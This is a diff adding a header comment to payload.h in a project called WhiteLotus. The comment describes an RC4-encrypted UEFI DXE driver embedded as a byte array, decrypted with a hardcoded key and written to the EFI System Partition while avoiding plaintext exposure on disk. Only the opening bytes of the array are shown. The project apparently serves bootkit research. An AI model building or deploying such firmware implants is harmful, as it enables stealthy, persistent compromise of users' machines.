@@ -1,3 +1,27 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — Windows EFI Installer
+ *  File     : payload.h
+ * ============================================================
+ *
+ *  Description:
+ *    RC4-encrypted binary of the WhiteLotus UEFI DXE driver
+ *    (WhiteLotus.efi), embedded as a C byte array. Decrypted
+ *    at runtime in main.c using the hardcoded key before
+ *    being written to the EFI System Partition.
+ *
+ *  Purpose:
+ *    - Bundle the WhiteLotus UEFI DXE driver binary inside
+ *      the EFI installer for single-binary deployment,
+ *      avoiding plaintext PE exposure on disk.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 unsigned char EfiPayload[28672] = {
  0x22, 0xFA, 0xB0, 0x33, 0x1D, 0x27, 0xB2, 0xEA, 0x69, 0x33, 0x53, 0x32,
  0x03, 0x61, 0xF8, 0x1A, 0x2D, 0xA6, 0x7F, 0x5F, 0x9D, 0x69, 0x45, 0xD1,
